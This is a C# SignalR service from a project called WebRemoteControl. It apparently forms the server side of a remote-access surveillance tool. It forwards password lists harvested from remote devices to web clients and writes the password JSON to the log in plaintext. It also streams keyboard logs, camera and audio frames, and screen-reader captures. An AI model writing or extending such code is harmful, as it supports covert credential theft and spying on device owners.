using Microsoft.AspNetCore.SignalR;
using WebRemoteControl.API.Hubs;
using WebRemoteControl.Core.Interfaces;
using WebRemoteControl.Core.Models;
using WebRemoteControl.Core.Services;

namespace WebRemoteControl.API.Services;

/// <summary>
/// 设备消息广播服务
/// 将设备消息通过 SignalR 广播到 Web 客户端
/// </summary>
public class DeviceMessageBroadcaster
{
    private readonly IDeviceConnectionService _connectionService;
    private readonly IHubContext<DeviceHub> _hubContext;
    private readonly ILogger<DeviceMessageBroadcaster> _logger;
    private readonly ScreenReaderFrameService? _screenReaderFrameService;

    public DeviceMessageBroadcaster(
        IDeviceConnectionService connectionService,
        IHubContext<DeviceHub> hubContext,
        ILogger<DeviceMessageBroadcaster> logger,
        ScreenReaderFrameService? screenReaderFrameService = null)
    {
        _connectionService = connectionService;
        _hubContext = hubContext;
        _logger = logger;
        _screenReaderFrameService = screenReaderFrameService;

        // 订阅设备事件
        _connectionService.DeviceConnected += OnDeviceConnected;
        _connectionService.DeviceDisconnected += OnDeviceDisconnected;
        _connectionService.MessageReceived += OnMessageReceived;
    }

    private async void OnDeviceConnected(object? sender, DeviceInfo deviceInfo)
    {
        _logger.LogInformation($"设备已连接: {deviceInfo.DeviceId} ({deviceInfo.DeviceName})");
        
        // 广播设备连接事件到所有 Web 客户端
        await _hubContext.Clients.All.SendAsync("DeviceConnected", deviceInfo);
    }

    private async void OnDeviceDisconnected(object? sender, string deviceId)
    {
        _logger.LogInformation($"设备已断开: {deviceId}");
        
        // 广播设备断开事件到所有 Web 客户端
        await _hubContext.Clients.All.SendAsync("DeviceDisconnected", deviceId);
    }

    private async void OnMessageReceived(object? sender, MessageReceivedEventArgs e)
    {
        var deviceId = e.DeviceId;
        var message = e.Message;

        // 根据消息类型进行不同的处理
        switch (message.Type)
        {
            case MessageType.VideoFrame:
                // 注释掉此处的视频帧转发，避免重复发送
                // VideoFrameForwardingService 已经处理了视频帧转发
                // await _hubContext.Clients.Group($"device_{deviceId}")
                //     .SendAsync("ReceiveVideoFrame", new
                //     {
                //         deviceId,
                //         frameData = Convert.ToBase64String(message.Payload),
                //         timestamp = message.Timestamp
                //     });
                break;

            case MessageType.StatusMessage:
                // 广播状态消息
                await _hubContext.Clients.Group($"device_{deviceId}")
                    .SendAsync("ReceiveStatusMessage", new
                    {
                        deviceId,
                        data = System.Text.Encoding.UTF8.GetString(message.Payload),
                        timestamp = message.Timestamp
                    });

                // 更新设备信息
                await UpdateDeviceInfo(deviceId, message.Payload);
                break;

            case MessageType.SystemControl:
                // 处理系统控制消息返回（包括密码相关）
                if (message.Payload.Length >= 2)
                {
                    // 解析命令类型
                    ushort commandType = (ushort)((message.Payload[0] << 8) | message.Payload[1]);

                    // 如果是密码命令 (11)
                    if (commandType == (ushort)SystemCommandType.Passwords && message.Payload.Length >= 7)
                    {
                        _logger.LogInformation($"收到密码数据: {deviceId}, 大小: {message.Payload.Length} bytes");

                        // 按照 WinForms 版的解析方式（参考 PwdControlCommand.cs:57-85）
                        // 跳过前3个字节（命令号2字节 + 参数个数1字节）
                        int offset = 3;

                        // 读取4字节的长度（大端序）
                        int jsonLength = (message.Payload[offset] << 24) |
                                       (message.Payload[offset + 1] << 16) |
                                       (message.Payload[offset + 2] << 8) |
                                       message.Payload[offset + 3];
                        offset += 4;

                        // 验证长度并提取JSON数据
                        if (jsonLength > 0 && offset + jsonLength <= message.Payload.Length)
                        {
                            var jsonData = System.Text.Encoding.UTF8.GetString(message.Payload, offset, jsonLength);

                            _logger.LogInformation($"解析密码JSON数据: {jsonData}");

                            // 广播密码列表数据
                            await _hubContext.Clients.Group($"device_{deviceId}")
                                .SendAsync("ReceivePasswordList", new
                                {
                                    deviceId,
                                    passwordData = jsonData,
                                    timestamp = message.Timestamp
                                });
                        }
                        else
                        {
                            _logger.LogWarning($"密码数据长度无效: jsonLength={jsonLength}, available={message.Payload.Length - offset}");
                        }
                    }
                }
                break;

            case MessageType.CameraFrame:
                // 广播摄像头帧
                await _hubContext.Clients.Group($"device_{deviceId}")
                    .SendAsync("ReceiveCameraFrame", new
                    {
                        deviceId,
                        frameData = Convert.ToBase64String(message.Payload),
                        timestamp = message.Timestamp
                    });
                break;

            case MessageType.AudioFrame:
                // 广播音频帧
                await _hubContext.Clients.Group($"device_{deviceId}")
                    .SendAsync("ReceiveAudioFrame", new
                    {
                        deviceId,
                        audioData = Convert.ToBase64String(message.Payload),
                        timestamp = message.Timestamp
                    });
                break;

            case MessageType.ReaderVideoFrame:
                // 使用帧管理服务处理桌面阅读器数据
                _logger.LogInformation($"收到桌面阅读器数据: {deviceId}, 大小: {message.Payload.Length} bytes");

                if (_screenReaderFrameService != null)
                {
                    // 通过帧管理服务处理，实现队列和性能优化
                    var frame = new ReaderFrame
                    {
                        UIData = System.Text.Encoding.UTF8.GetString(message.Payload),
                        Timestamp = DateTimeOffset.UtcNow
                    };
                    _screenReaderFrameService.EnqueueFrame(deviceId, frame);
                }
                else
                {
                    // 直接广播（旧逻辑）
                    await _hubContext.Clients.Group($"device_{deviceId}")
                        .SendAsync("ReceiveReaderFrame", new
                        {
                            deviceId,
                            uiData = System.Text.Encoding.UTF8.GetString(message.Payload),
                            timestamp = message.Timestamp
                        });
                }
                break;

            case MessageType.CrashLog:
            case MessageType.AppLog:
            case MessageType.KeyboardLog:
                // 广播日志消息
                await _hubContext.Clients.Group($"device_{deviceId}")
                    .SendAsync("ReceiveLog", new
                    {
                        deviceId,
                        logType = message.Type.ToString(),
                        data = System.Text.Encoding.UTF8.GetString(message.Payload),
                        timestamp = message.Timestamp
                    });
                break;

            default:
                _logger.LogDebug($"收到未处理的消息类型: {message.Type} from {deviceId}");
                break;
        }
    }

    private async Task UpdateDeviceInfo(string deviceId, byte[] payload)
    {
        try
        {
            var json = System.Text.Encoding.UTF8.GetString(payload);
            var deviceInfo = System.Text.Json.JsonSerializer.Deserialize<DeviceInfo>(json);
            
            if (deviceInfo != null)
            {
                // 广播设备信息更新
                await _hubContext.Clients.All.SendAsync("DeviceInfoUpdated", deviceInfo);
            }
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, $"解析设备信息失败: {deviceId}");
        }
    }
}

